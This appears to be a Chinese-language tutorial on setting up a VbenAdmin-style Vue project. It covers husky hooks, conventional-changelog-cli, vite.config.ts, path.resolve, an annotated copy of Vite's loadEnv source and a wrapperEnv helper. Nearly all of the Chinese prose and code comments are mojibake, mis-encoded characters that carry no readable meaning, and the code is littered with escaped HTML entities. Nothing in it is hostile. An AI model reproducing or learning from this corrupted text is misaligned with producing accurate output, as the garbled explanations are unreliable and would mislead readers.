100644 .husky/commit-msg create mode 100644 .husky/common.sh create mode 100644 .husky/lintstagedrc.js create mode 100644 .husky/pre-commit # æ¨é€å‡ºå» git push -u origin master ä½¿ç”¨conventional-changelog-cliç”Ÿæˆè®Šæ›´è¨˜éŒ„ èªªæ˜ åœ¨VbenAdminé …ç›®çš„è…³æœ¬å‘½ä»¤å’Œæ ¹ç›®éŒ„ä¸­é‚„æœ‰CHANGELOG.mdé€™éº¼å€‹æ–‡ä»¶ï¼Œé€™æ˜¯è¨˜éŒ„æˆ‘å€‘é …ç›®è®Šæ›´è¨˜éŒ„çš„MDã€‚æ˜é¡¯ä¸æ˜¯æ‰‹å¯«å‡ºä¾†çš„ï¼Œé‚£éº¼æ€éº¼ç”Ÿæˆï¼Ÿ\nåƒè€ƒé€£çµï¼š\nconventional-changelog-cliçš„Gitèªªæ˜ conventional-changelog-cliçš„npmé¦–é  å®‰è£ 1 yarn add global conventional-changelog-cli --dev é…ç½®è…³æœ¬ package.jsonæ–‡ä»¶ä¸­çš„scriptså­—æ®µã€‚\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;log\u0026#34;: \u0026#34;conventional-changelog -p angular -i CHANGELOG.md -s\u0026#34;, // ... } æ¸¬è©¦ 1 yarn log å¯ä»¥çœ‹è¦‹ç”Ÿæˆäº†CHANGELOG.mdæ–‡ä»¶\n1 2 3 4 5 6 # 0.0.0 (2022-10-13) ### Features - æˆ‘ä»¬æˆåŠŸçš„è§„èŒƒäº† Git æäº¤! ([6c61fc5](https://gitee.com/kuxiaoxin/vben3/commits/6c61fc5c0bc9d0ed551117eb00349ce82e35deea)) å‘½ä»¤åˆ—åƒæ•¸ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 \u0026gt; conventional-changelog --help Generate a changelog from git metadata Usage conventional-changelog Example conventional-changelog -i CHANGELOG.md --same-file Options -i, --infile Read the CHANGELOG from this file # å¾é€™å€‹æ–‡ä»¶ä¸­è®€å–CHANGELOGã€‚ -o, --outfile Write the CHANGELOG to this file If unspecified, it prints to stdout # å°‡CHANGELOGå¯«å…¥é€™å€‹æ–‡ä»¶ã€‚ # å¦‚æœæ²’æœ‰æŒ‡å®šï¼Œå‰‡æ‰“å°åˆ°stdoutã€‚ -s, --same-file Outputting to the infile so you don\\\u0026#39;t need to specify the same file as outfile # è¼¸å‡ºåˆ°infileï¼Œæ‰€ä»¥ä½ ä¸éœ€è¦æŒ‡å®šèˆ‡outfileç›¸åŒçš„æ–‡ä»¶ã€‚ -p, --preset Name of the preset you want to use. Must be one of the following: angular, atom, codemirror, ember, eslint, express, jquery, jscs or jshint # æ‚¨è¦ä½¿ç”¨çš„é è¨­åç¨±ã€‚å¿…é ˆæ˜¯ä¸‹åˆ—ä¹‹ä¸€ã€‚ # angular, atom, codemirror, # ember, eslint, express, # jquery, jscs, jshintã€‚ -k, --pkg A filepath of where your package.json is located Default is the closest package.json from cwd # æ‚¨çš„ package.json æ‰€åœ¨çš„æ–‡ä»¶è·¯å¾‘ã€‚ # é»˜èªç‚ºcwdä¸­æœ€æ¥è¿‘çš„package.jsonã€‚ -a, --append Should the newer release be appended to the older release Default: \\false # æ˜¯å¦æ‡‰å°‡è¼ƒæ–°çš„ç‰ˆæœ¬é™„åŠ åˆ°è¼ƒèˆŠçš„ç‰ˆæœ¬ä¸Šï¼Ÿ # é»˜èªï¼šä¸è¿½åŠ  -r, --release-count How many releases to be generated from the latest If 0, the whole changelog will be regenerated and the outfile will be overwritten Default: 1 # å°‡å¾æœ€æ–°çš„ç‰ˆæœ¬ä¸­ç”Ÿæˆå¤šå°‘å€‹ç‰ˆæœ¬ã€‚ # å¦‚æœç‚º0ï¼Œæ•´å€‹è®Šæ›´æ—¥èªŒå°‡è¢«é‡æ–°ç”Ÿæˆï¼Œä¸¦ä¸”è¼¸å‡ºæ–‡ä»¶å°‡è¢«è¦†è“‹ã€‚ # é»˜èªå€¼: 1 --skip-unstable If given, unstable tags will be skipped, e.g., x.x.x-alpha.1, x.x.x-rc.2 # å¦‚æœçµ¦å®šï¼Œå°‡è·³éä¸ç©©å®šçš„æ¨™ç±¤ï¼Œä¾‹å¦‚ï¼Œx.x.x-alpha.1, x.x.x-rc.2ã€‚ -u, --output-unreleased Output unreleased changelog # è¼¸å‡ºæœªç™¼å¸ƒçš„è®Šæ›´æ—¥èªŒã€‚ -v, --verbose Verbose output. Use this \\for debugging Default: \\false # Verbose è¼¸å‡ºã€‚ç”¨ä¾†èª¿è©¦ # é»˜èªï¼šä¸è¼¸å‡º -n, --config A filepath of your config script Example of a config script: https://github.com/conventional-changelog/conventional-changelog/blob/master/packages/conventional-changelog-cli/test/fixtures/config.js # é…ç½®è…³æœ¬çš„æ–‡ä»¶è·¯å¾‘ã€‚ # é…ç½®è…³æœ¬çš„ä¾‹å­ï¼š # https://github.com/conventional-changelog # /conventional-changelog/blob/master/packages # /conventional-changelog-cli/test/fixtures/config.js -c, --context A filepath of a json that is used to define template variables # ä¸€å€‹ç”¨æ–¼å®šç¾©æ¨¡æ¿è®Šé‡çš„jsonæ–‡ä»¶è·¯å¾‘ã€‚ -l, --lerna-package Generate a changelog \\for a specific lerna package (:pkg-name@1.0.0) # ç‚ºä¸€å€‹ç‰¹å®šçš„lernaåŒ…ç”Ÿæˆä¸€å€‹è®Šæ›´æ—¥èªŒ(:pkg-name@1.0.0) -t, --tag-prefix Tag prefix to consider when reading the tags # è®€å–æ¨™ç±¤æ™‚è¦è€ƒæ…®çš„æ¨™ç±¤å‰ç¶´ã€‚ --commit-path Generate a changelog scoped to a specific directory # ç”Ÿæˆä¸€å€‹ç‰¹å®šç›®éŒ„ä¸‹çš„è®Šæ›´æ—¥èªŒã€‚ é…ç½®Vite èªªæ˜ æœ¬ç« åªæ˜¯æº–å‚™ï¼Œå¤§å®¶å¯ä»¥ç›´æ¥æŠŠVbenAdminçš„vite.config.tsåŸä»£ç¢¼è¤‡è£½åˆ°æˆ‘å€‘çš„é …ç›®ä¸­ã€‚ç„¶å¾ŒæŠŠå ±éŒ¯çš„åœ°æ–¹è¨»é‡‹æ‰ã€‚æ¥ä¸‹ä¾†çš„ç« ç¯€æœƒæŠŠé€™å€‹æ–‡ä»¶ä¸€æ®µä¸€æ®µçš„è§£æå‡ºä¾†ã€‚ç« ç¯€åšå¤ªé•·äº†å¤§å®¶æ‡‰è©²ä¹Ÿä¸å–œæ­¡çœ‹ï¼Œè‡³å°‘æˆ‘ä¸å–œæ­¡çœ‹é•·æ–‡ç« ã€‚\nä»£ç¢¼ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 import type { UserConfig, ConfigEnv } from \u0026#39;vite\u0026#39;; import { loadEnv } from \u0026#39;vite\u0026#39;; import { resolve } from \u0026#39;path\u0026#39;; // import { generateModifyVars } from \u0026#39;./build/config/themeConfig\u0026#39;; // import { createProxy } from \u0026#39;./build/vite/proxy\u0026#39;; // import { wrapperEnv } from \u0026#39;./build/utils\u0026#39;; // import { createVitePlugins } from \u0026#39;./build/vite/plugin\u0026#39;; // import { OUTPUT_DIR } from \u0026#39;./build/constant\u0026#39;; function pathResolve(dir: string) { return resolve(__dirname, \u0026#39;.\u0026#39;, dir); } export default ({ command, mode }: ConfigEnv): UserConfig =\u0026gt; { const root = process.cwd() const env = loadEnv(mode, root) // The boolean type read by loadEnv is a string. This function can be converted to boolean type // const viteEnv = wrapperEnv(env); // const { VITE_PORT, VITE_PUBLIC_PATH, VITE_PROXY, VITE_DROP_CONSOLE, VITE_LEGACY } = viteEnv; // const isBuild = command === \u0026#39;build\u0026#39;; return { // base: VITE_PUBLIC_PATH, root, resolve: { alias: [ { // /@/xxxx =\u0026gt; src/xxx find: /^\\/@\\//, replacement: pathResolve(\u0026#39;src\u0026#39;) + \u0026#39;/\u0026#39; }, { // /#/xxxx =\u0026gt; types/xxx find: /^\\/#\\//, replacement: pathResolve(\u0026#39;types\u0026#39;) + \u0026#39;/\u0026#39; } ] }, server: { // port: VITE_PORT, // Load proxy configuration from .env // proxy: createProxy(VITE_PROXY), hmr: { overlay: true } }, build: { // minify: \u0026#39;esbuild\u0026#39;, // outDir: OUTPUT_DIR, // polyfillDynamicImport: VITE_LEGACY, terserOptions: { compress: { keep_infinity: true, // Used to delete console in production environment // drop_console: VITE_DROP_CONSOLE, }, }, // Turning off brotliSize display can slightly reduce packaging time brotliSize: false, chunkSizeWarningLimit: 1200 }, define: { // setting vue-i18-next // Suppress warning __VUE_I18N_LEGACY_API__: false, __VUE_I18N_FULL_INSTALL__: false, __INTLIFY_PROD_DEVTOOLS__: false }, css: { preprocessorOptions: { less: { modifyVars: { // Used for global import to avoid the need to import each style file separately // reference: Avoid repeated references hack: `true; @import (reference) \u0026#34;${resolve(\u0026#39;src/design/config.less\u0026#39;)}\u0026#34;;` // ...generateModifyVars(), }, javascriptEnabled: true } } }, // The vite plugin used by the project. The quantity is large, so it is separately extracted and managed // plugins: createVitePlugins(viteEnv, isBuild), optimizeDeps: { // @iconify/iconify: The dependency is dynamically and virtually loaded by @purge-icons/generated, so it needs to be specified explicitly include: [ \u0026#39;@iconify/iconify\u0026#39;, \u0026#39;ant-design-vue/es/locale/zh_CN\u0026#39;, \u0026#39;moment/dist/locale/zh-cn\u0026#39;, \u0026#39;ant-design-vue/es/locale/en_US\u0026#39;, \u0026#39;moment/dist/locale/eu\u0026#39;, ], exclude: [\u0026#39;vue-demi\u0026#39;] } } } Nodeçš„path.resolveæ–¹æ³• èªªæ˜ psth.resolve([...paths])æ–¹æ³•æ˜¯NodeApiä¸­pathæ¨¡å¡Šçš„æ–¹æ³•ã€‚\nåƒè€ƒé€£çµ Nodeä¸­æ–‡API path.resolve([\u0026hellip;paths])æ–¹æ³• path.resolve([\u0026hellip;path])æ–¹æ³•åœ¨ç·šé‹è¡Œ psth.resolve([\u0026hellip;pth])è¼ƒé€šä¿—çš„ç†è§£ VbenAdminåŸä»£ç¢¼ 1 2 3 4 5 import { resolve } from \u0026#39;path\u0026#39; function pathResolve(dir: string) { return resolve(__dirname, \u0026#39;.\u0026#39;, dir) } ä»£ç¢¼åœ¨é …ç›®ä¸­å ±éŒ¯ æ­¤æ™‚å¼•å…¥é …ç›®æœƒå ±éŒ¯ï¼šæ‰¾ä¸åˆ° pathã€‚\nå› ç‚ºæˆ‘å€‘æ²’æœ‰å®‰è£nodeçš„è²æ˜æ–‡ä»¶ï¼Œtsè£¡é¢æ²’æœ‰ã€‚\n1 yarn add @types/node --dev é€™å€‹é–‹ç™¼ä¾è³´åœ¨åŸVbenAdminé …ç›®ä¸­æ²’æœ‰ï¼Œæ˜¯å› ç‚ºå…¶ä»–ä¾è³´ä¸­æœ‰é€™å€‹ä¾è³´ã€‚\nä½†æ˜¯æˆ‘å€‘ç¾åœ¨é‚„æ²’æœ‰å®‰è£åŒ…å«@types/nodeçš„ä¾è³´ã€‚\nå‰©ä¸‹çš„ä¾è³´è£¡é¢æœ‰å¾ˆå¤šé€™æ¨£çš„ä¾è³´ï¼Œæˆ‘å€‘ä¹Ÿä¸å»çŒœæ˜¯å“ªå€‹ä¾è³´äº†ã€‚\nåæ­£æ˜¯ä¸€å€‹é–‹ç™¼ä¾è³´ï¼Œæˆ‘å€‘ç›´æ¥è‡ªå·±æ‰‹å‹•å®‰è£äº†ã€‚\nresolveæ–¹æ³• è©²æ–¹æ³•ç™¾åº¦ä¸Šæœ‰å…©ç¨®èªªæ³•ï¼š\nå¾å¾Œå‘å‰ï¼Œç”Ÿæˆçµ•å°è·¯å¾‘ã€‚ è‹¥å­—ç¬¦ä»¥ / é–‹é ­ï¼Œä¸æœƒæ‹¼æ¥åˆ°å‰é¢çš„è·¯å¾‘ï¼ˆå› ç‚ºæ‹¼æ¥åˆ°æ­¤å·²ç¶“æ˜¯ä¸€å€‹çµ•å°è·¯å¾‘ï¼‰ã€‚ è‹¥ä»¥ ../ é–‹é ­ï¼Œæ‹¼æ¥å‰é¢çš„è·¯å¾‘ï¼Œä¸”ä¸å«æœ€å¾Œä¸€ç¯€è·¯å¾‘ã€‚ è‹¥ä»¥ ./ é–‹é ­ æˆ–è€…æ²’æœ‰ç¬¦è™Ÿ å‰‡æ‹¼æ¥å‰é¢è·¯å¾‘ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼šå¦‚æœåœ¨è™•ç†å®Œæ‰€æœ‰çµ¦å®šçš„ path ç‰‡æ®µä¹‹å¾Œé‚„æœªç”Ÿæˆçµ•å°è·¯å¾‘ï¼Œå‰‡å†åŠ ä¸Šç•¶å‰å·¥ä½œç›®éŒ„ã€‚ æ¯ä¸€å€‹åƒæ•¸éƒ½ç†è§£ç‚ºä¸€å€‹cdå‘½ä»¤ã€‚æœ€çµ‚cdåˆ°å“ªå€‹è·¯å¾‘ã€‚è¿”å›è©²çµ•å°è·¯å¾‘ã€‚ __dirname NodeApiçš„__dirnameï¼šç•¶å‰æ¨¡å¡Šç›®éŒ„åã€‚\nNodeApiæ–‡æª”-__dirnameèªªæ˜ __dirnameåœ¨ç·šé‹è¡Œ åœ¨ç·šé‹è¡Œ 1 2 3 4 5 6 const path = require(\u0026#39;path\u0026#39;) console.log(__dirname) console.log(path.resolve(__dirname, \u0026#39;.\u0026#39;, \u0026#39;src\u0026#39;)) // /tmp/B3YQQ1 // /tmp/B3YQQ1/src Viteçš„æƒ…æ™¯é…ç½® èªªæ˜ æœ¬ç« æ”¶é›†äº†ä¸€äº›Viteå¦‚ä½•æ ¹æ“šä¸åŒç’°å¢ƒé€²è¡Œä¸åŒé…ç½®çš„è³‡æ–™ã€‚\nåƒè€ƒé€£çµ Viteçš„ä¸­æ–‡é¦–é  Viteçš„è‹±æ–‡é¦–é  Viteçš„æƒ…æ™¯é…ç½®èªªæ˜ ä»£ç¢¼ ç¸½ä¹‹ä¸ç®¡ä½¿ç”¨ä»€éº¼æ–¹å¼é…ç½®Viteï¼Œæœ€å¾Œè¿”å›çš„å°±åªæ˜¯ä¸€å€‹å°è±¡ã€‚å°åƒä¸­åŒ…å«Viteé…ç½®çš„ç´°ç¯€ã€‚\n1 2 3 4 5 6 7 8 9 10 11 export default ({ command, mode }) =\u0026gt; { if (command === \u0026#34;serve\u0026#34;) { return { // serve ç¨æœ‰é…ç½® } } else { return { // build ç¨æœ‰é…ç½® } } } åƒæ•¸èªªæ˜ viteç›®å‰åªæœ‰viteã€vite buildã€vite previewé€™ä¸‰ç¨®å‘½ä»¤ã€‚ä»¥ä¸‹æ˜¯é€™ä¸‰ç¨®å‘½ä»¤çš„commandå’Œmodeçš„å€¼ã€‚\nvite commandï¼šserve modeï¼šdevelopment vite build commandï¼šbuild modeï¼šproduction vite preview commandï¼šserve modeï¼šdevelopment Nodeçš„process èªªæ˜ è¿”å› Node.js é€²ç¨‹çš„ç•¶å‰å·¥ä½œç›®éŒ„ã€‚\nåƒè€ƒé€£çµ Nodeä¸­æ–‡æ–‡æª”-process Nodeä¸­æ–‡æ–‡æª”-process.cwd()æ–¹æ³• åœ¨ç·šé‹è¡Œprocess.cwd() ä»£ç¢¼ 1 process.cwd() Viteçš„loadEnvæ–¹æ³• èªªæ˜ æª¢æŸ¥process.cwd()è·¯å¾‘ä¸‹.env.development.localã€.env.developmentã€.env.localã€.envé€™å››å€‹ç’°å¢ƒæ–‡ä»¶ã€‚ è¼¸å‡ºNODE_ENVå’ŒVITE_é–‹é ­çš„éµå€¼å°ã€‚ VITE_é–‹é ­çš„éµå€¼å°å¾Œé¢çš„ä¸æœƒè¦†è“‹å‰é¢çš„ã€‚ NODE_ENVçš„å€¼å¾Œé¢çš„æœƒè¦†è“‹å‰é¢çš„ã€‚ åƒè€ƒé€£çµ NodeApiä¸­æ–‡æ–‡æª”-process NodeApiä¸­æ–‡æ–‡æª”-process-envèªªæ˜ NodeApiä¸­æ–‡æ–‡æª”-path NodeApiä¸­æ–‡æ–‡æª”-path.join()æ–¹æ³• NodeApiä¸­æ–‡æ–‡æª”-path.dirname()æ–¹æ³• NodeApiä¸­æ–‡æ–‡æª”-fs NodeApiä¸­æ–‡æ–‡æª”-fs.existsSync()æ–¹æ³• NodeApiä¸­æ–‡æ–‡æª”-fs.statSync()æ–¹æ³• NodeApiä¸­æ–‡æ–‡æª”-fs.readFileSync()æ–¹æ³• Node-process-envåœ¨ç·šé‹è¡Œ Linuxæ‰‹å†Šé -environ(7) Viteé …ç›®ä¸‹.envç³»åˆ—æ–‡ä»¶å‘½åçš„æ„ç¾©-ä¸­æ–‡æ–‡æª” Viteé …ç›®ä¸‹.envç³»åˆ—æ–‡ä»¶å‘½åçš„æ„ç¾©-è‹±æ–‡æ–‡æª” åŸå§‹ç¢¼ å‰ç½®ä»£ç¢¼ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 // â†“ åŠ è¼‰nodeçš„pathæ¨¡å¡Š var path$1 = require(\u0026#39;path\u0026#39;); var fs$2 = require(\u0026#39;fs\u0026#39;); // â†“ å‚³å…¥çš„å¦‚æœæ˜¯ä¸€å€‹åŒ…å«\u0026#39;default\u0026#39;çš„keyçš„å°è±¡ï¼Œå‰‡è¼¸å‡ºå°è±¡çš„\u0026#39;default\u0026#39;çš„keyå°æ‡‰çš„valueã€‚ function _interopDefaultLegacy (e) { return e \u0026amp;\u0026amp; typeof e === \u0026#39;object\u0026#39; \u0026amp;\u0026amp; \u0026#39;default\u0026#39; in e ? e[\u0026#39;default\u0026#39;] : e; } // â†“ çµåˆä¸Šé¢äºŒè€… var path__default = /*#__PURE__*/_interopDefaultLegacy(path$1); var fs__default = /*#__PURE__*/_interopDefaultLegacy(fs$2); // â†“ æª¢æŸ¥dirä¸‹æ˜¯å¦æœ‰formatsä¸­çš„è·¯å¾‘ï¼Œè¿”å›æœ‰å°±è¿”è¿´è·¯å¾‘æˆ–è€…æ–‡ä»¶ function lookupFile(dir, formats, pathOnly = false) { for (const format of formats) { // â†“ è¼¸å‡ºdirå’Œformatsé€£æ¥å¾Œçš„è·¯å¾‘ const fullPath = path__default.join(dir, format); // â†“ åŒæ­¥çš„æª¢æŸ¥è©²è·¯å¾‘æ˜¯å¦å­˜åœ¨ï¼Œä¸¦ä¸”è©²è·¯å¾‘å°æ‡‰çš„æ˜¯ä¸€å€‹æ–‡ä»¶ if (fs__default.existsSync(fullPath) \u0026amp;\u0026amp; fs__default.statSync(fullPath).isFile()) { // â†“ æ˜¯å¦åªè¦è¼¸å‡ºè·¯å¾‘ï¼Œå¦å‰‡è¼¸å‡ºæ–‡ä»¶ return pathOnly ? fullPath : fs__default.readFileSync(fullPath, \u0026#39;utf-8\u0026#39;); } } // â†“ ä¸Šé¢çš„è·¯å¾‘éƒ½ä¸æ»¿è¶³è¼¸å‡ºæ¢ä»¶ï¼Œé‚£éº¼å†æª¢æŸ¥ä¸€éæª¢æŸ¥å‚³å…¥çš„dirçš„ç›®éŒ„å const parentDir = path__default.dirname(dir); if (parentDir !== dir) { return lookupFile(parentDir, formats, pathOnly); } } ä»£ç¢¼ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 // å¾å‚³åƒçš„rootç›®éŒ„ä¸‹ç²å– // æŒ‰é †åº .env.${mode}.localã€.env.${mode}ã€.env.localã€.envé€™å››å€‹ç’°å¢ƒæ–‡ä»¶ // è¼¸å‡ºæ–‡ä»¶å…§é…ç½®çš„å°è±¡ function loadEnv(mode, root, prefix = \u0026#39;VITE_\u0026#39;) { if (mode === \u0026#39;local\u0026#39;) { // â†“ å¦‚æœç¬¬ä¸€å€‹åƒæ•¸å‚³å…¥\u0026#39;local\u0026#39;ï¼Œå°±å ±éŒ¯ï¼š // â†“ \u0026#34;local \u0026#34;ä¸èƒ½ç”¨ä½œæ¨¡å¼åç¨±ï¼Œå› ç‚ºå®ƒèˆ‡``.envæ–‡ä»¶çš„.localå¾Œç¶´è¡çªã€‚ throw new Error(`\u0026#34;local\u0026#34; cannot be used as a mode name because it conflicts with ` + `the .local postfix for .env files.`); } // â†“ å¾…è¼¸å‡ºçš„ç’°å¢ƒè®Šé‡å°è±¡ const env = {}; // â†“ è¦è®€å–çš„å››å€‹æ–‡ä»¶åç¨±çš„å­—ç¬¦ä¸²æ•¸çµ„ const envFiles = [ /** mode local file */ `.env.${mode}.local`, /** mode file */ `.env.${mode}`, /** local file */ `.env.local`, /** default file */ `.env` ]; // â†“ æª¢æŸ¥æ˜¯å¦æœ‰å¯¦éš›çš„ä»¥VITE_*é–‹é ­çš„ç’°å¢ƒè®Šé‡ã€‚ // â†“ é€™äº›é€šå¸¸æ˜¯Nodeå…§è¯æä¾›çš„envå°è±¡ï¼Œä¸¦æ‡‰å„ªå…ˆè€ƒæ…®ã€‚ for (const key in process.env) { if (key.startsWith(prefix) \u0026amp;\u0026amp; env[key] === undefined) { env[key] = process.env[key]; } } for (const file of envFiles) { // â†“ æª¢æŸ¥æ ¹ç›®éŒ„ä¸‹æ˜¯å¦æœ‰æŒ‡å®šé…ç½®æ–‡ä»¶ const path = lookupFile(root, [file], true); if (path) { // â†“ ä»¥æ›è¡Œç‚ºå–®ä½è¼¸å‡ºæ–‡ä»¶ä¸­KEY=VALæ ¼å¼çš„åˆ°çµæœå°åƒä¸­ const parsed = main$2.parse(fs__default.readFileSync(path), { debug: !!process.env.DEBUG || undefined }); // â†“ è®“ç’°å¢ƒè®Šé‡äº’ç›¸ä½¿ç”¨ï¼Œé€™å€‹æ–¹æ³•æˆ‘æ²’ä»”ç´°ç ”ç©¶ã€‚ä¸æ˜¯å¾ˆæ‡‚ main$1({ parsed, // â†“ é˜²æ­¢process.envä¿®æ”¹ ignoreProcessEnv: true }); // â†“ åªè¼¸å‡ºä»¥prefixé–‹é ­çš„key for (const [key, value] of Object.entries(parsed)) { // â†“ åªæœ‰é€™å€‹keyåœ¨å‰é¢æ²’æœ‰åŠ è¼‰éæ‰è³¦å€¼ if (key.startsWith(prefix) \u0026amp;\u0026amp; env[key] === undefined) { env[key] = value; } else if (key === \u0026#39;NODE_ENV\u0026#39;) { // â†“ åœ¨.envæ–‡ä»¶ä¸­è¦†è“‹NODE_ENVã€‚ process.env.VITE_USER_NODE_ENV = value; } } } } return env; } Vbenä¸­çš„wrapperEnvæ–¹æ³• èªªæ˜ 1 2 // The boolean type read by loadEnv is a string. This function can be converted to boolean type const viteEnv = wrapperEnv(env); ç¿»è­¯å¦‚ä¸‹ï¼š\nloadEnvè®€å–çš„å¸ƒçˆ¾é¡å‹æ˜¯ä¸€å€‹å­—ç¬¦ä¸²ã€‚è©²å‡½æ•¸å¯ä»¥è½‰æ›ç‚ºå¸ƒçˆ¾é¡å‹ã€‚\nå‰µå»ºwrapperEnvæ–¹æ³• å¾é€™é–‹å§‹æ¶‰åŠåˆ°æ ¹ç›®éŒ„ä¸‹çš„buildæ–‡ä»¶å¤¾äº†ã€‚å‰µå»ºè©²æ–‡ä»¶å¤¾ã€‚æˆ‘å€‘ä½¿ç”¨buildæ–‡ä»¶å¤¾è£æ‰€æœ‰é—œæ–¼é …ç›®æ§‹å»ºé¡çš„æ±è¥¿ã€‚\nå‰µå»ºå®šç¾©æ–‡ä»¶ æ ¹ç›®éŒ„ä¸‹çš„buildæ–‡ä»¶å¤¾å‰µå»ºtypeing.d.tsæ–‡ä»¶ã€‚\ntypeing.d.ts 1 2 3 4 5 6 declare module \u0026#39;*.json\u0026#39; { const src: any; export default src; } declare type Recordable = Record\u0026lt;string, any\u0026gt;; åƒè€ƒé€£çµ TSé€šç”¨æ¨¡å¡Šè²æ˜ TSçš„é«˜ç´šé¡å‹Record å…è¨±å°å…¥Jsoné€™æ®µä»£ç¢¼ï¼Œå¯«åœ¨å“ªéƒ½è¡Œã€‚ TSéƒ½æœƒåŠ è¼‰åˆ°ã€‚ å®šç¾©Envå°åƒé¡å‹ æ ¹ç›®éŒ„ä¸‹çš„buildæ–‡ä»¶å¤¾å‰µå»ºutils.tsæ–‡ä»¶ã€‚\nutils.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 export interface ViteEnv { VITE_PORT: number VITE_USE_MOCK: boolean VITE_USE_PWA: boolean VITE_PUBLIC_PATH: string VITE_PROXY: [string, string][] VITE_GLOB_APP_TITLE: string VITE_GLOB_APP_SHORT_NAME: string VITE_USE_CDN: boolean VITE_DROP_CONSOLE: boolean VITE_BUILD_COMPRESS: \u0026#39;gzip\u0026#39; | \u0026#39;brotli\u0026#39; | \u0026#39;none\u0026#39; VITE_LEGACY: boolean VITE_USE_IMAGEMIN: boolean } å°å‡ºçš„é€™å€‹é¡å‹å°æ‡‰äº†æˆ‘å€‘é…ç½®æ–‡ä»¶ä¸­çš„Keyã€‚\næ ¼å¼åŒ–Envå°è±¡çš„wrapperEnvæ–¹æ³• åœ¨utils.tsæ–‡ä»¶ä¸­æ·»åŠ ä»¥ä¸‹æ–¹æ³•ï¼š\nutils.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 export function wrapperEnv(envConf: Recordable): ViteEnv { const ret: any = {}; for (const envName of Object.keys(envConf)) { let realName = envConf[envName].replace(/\\\\n/g, \u0026#39;\\n\u0026#39;); realName = realName === \u0026#39;true\u0026#39; ? true : realName === \u0026#39;false\u0026#39; ? false : realName; if (envName === \u0026#39;VITE_PORT\u0026#39;) { realName = Number(realName); } if (envName === \u0026#39;VITE_PROXY\u0026#39;) { try { realName = JSON.parse(realName); } catch (error) {} } ret[envName] = realName; process.env[envName] = realName; } return ret; } ä»£ç¢¼èªªæ˜ï¼š ä¸­é–“çš„æ­£å‰‡æ›¿æ›å°±æ˜¯å°‡\\\\næ›¿æ›æˆ\\nï¼Œè¤‡è£½ä¸‹é¢é€™äº›ä»£ç¢¼å¯ä»¥å»ç€è¦½å™¨ä¸­é«”é©—ä¸€ä¸‹ã€‚ console.log('asda\\\\\\n\\\\n\\n'.replace(/\\n/g, '\\n')) =\u0026gt; asda\\ [å›è»Š\\n] \\n [å›è»Š\\n] console.log('asda\\\\\\n\\\\n\\n'.replace(/\\\\n/g, '\\n')) =\u0026gt; asda\\ [å›è»Š\\n] [å›è»Š\\n] [å›è»Š\\n] console.log('asda\\\\\\n\\\\n\\n'.replace(/\\\\\\n/g, '\\n')) =\u0026gt; asda [å›è»Š\\n] \\n [å›è»Š\\n] vite.config.tsæ–‡ä»¶å¾©ç›¤ è‡ªæ­¤vite.config.tsï¼Œé™¤returnè£¡é¢çš„æ±è¥¿å¤–ï¼Œå…¶ä»–çš„éƒ½å·²ç¶“è§£æå®Œäº†ã€‚ä»¥ç¾åœ¨å¯ä»¥å¾—åˆ°é€™æ¨£ä¸€å€‹ä»£ç¢¼ï¼š\nvite.config.ts 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 import { resolve } from \u0026#39;path\u0026#39;; import { ConfigEnv, loadEnv, UserConfig } from \u0026#39;vite\u0026#39;; import { wrapperEnv } from \u0026#39;./build/util\u0026#39;; function pathResolve(dir: string) { return resolve(__dirname, \u0026#39;.\u0026#39;, dir); } export default ({ command, mode }: ConfigEnv): UserConfig =\u0026gt; { const root = process.cwd(); const env = loadEnv(mode, root); const viteEnv = wrapperEnv(env); const { VITE_PORT, VITE_PUBLIC_PATH, VITE_PROXY, VITE_DROP_CONSOLE, VITE_LEGACY } = viteEnv; const isBuild = command === \u0026#39;build\u0026#39;; return {}; }; Viteé…ç½®-base èªªæ˜ Viteé…ç½®-baseèªªæ˜\nå®˜ç¶²åŸæ–‡ï¼š\né¡å‹ï¼š string é»˜èªï¼š / é–‹ç™¼æˆ–ç”Ÿç”¢ç’°å¢ƒæœå‹™çš„ å…¬å…±åŸºç¤è·¯å¾‘ã€‚åˆæ³•çš„å€¼åŒ…æ‹¬ä»¥ä¸‹å¹¾ç¨®ï¼š\nçµ•å° URL è·¯å¾‘åï¼Œä¾‹å¦‚ /foo/ å®Œæ•´çš„ URLï¼Œä¾‹å¦‚ https://foo.com/ ç©ºå­—ç¬¦ä¸²æˆ– ./ï¼ˆç”¨æ–¼é–‹ç™¼ç’°å¢ƒï¼‰ æ›´å¤šä¿¡æ¯è©³è¦‹å…¬å…±åŸºç¤è·¯å¾‘ã€‚\nå°±æ˜¯ä½ çš„é …ç›®çš„BaseURLã€‚æ¯”å¦‚é€™è£¡æˆ‘é…ç½®ä¸€å€‹yiu\né‚£éº¼æˆ‘çš„é …ç›®è¨ªå•ï¼šhttp://localhost:3000/yiu/\nç•¶ä½ è¨ªå•å…¶ä»–è·¯å¾‘å°±æœƒå ±éŒ¯ï¼šhttp://localhost:3000/any/\n1 The server is configured with a public base URL of /yiu/ - did you mean to visit /yiu/any/ instead? Viteé…ç½®-root èªªæ˜ Viteé…ç½®-rootèªªæ˜\nå®˜ç¶²åŸæ–‡ï¼š\né¡å‹ï¼š string é»˜èªï¼š process.cwd() é …ç›®æ ¹ç›®éŒ„ï¼ˆindex.html 